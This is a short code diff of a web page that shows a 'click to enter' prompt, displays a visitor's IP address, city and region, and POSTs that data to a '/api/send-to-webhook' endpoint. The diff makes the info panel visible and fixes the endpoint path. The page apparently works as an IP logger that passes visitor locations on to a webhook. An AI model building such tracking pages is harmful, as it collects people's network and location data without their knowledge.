@@ -8,7 +8,8 @@
 </head>
 <body id="main-body">
   <div id="enter">click to enter</div>
-  <div id="info" style="display: none;">
+
+  <div id="info">
     <p><strong>IP Address:</strong> <span id="ip"></span></p>
     <p><strong>City:</strong> <span id="city"></span></p>
     <p><strong>Region:</strong> <span id="region"></span></p>
@@ -48,7 +49,7 @@
         document.getElementById('info').style.display = 'block';
 
         // Send to backend API
-        await fetch('/api/send-to-webhook.js', {
+        await fetch('/api/send-to-webhook', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
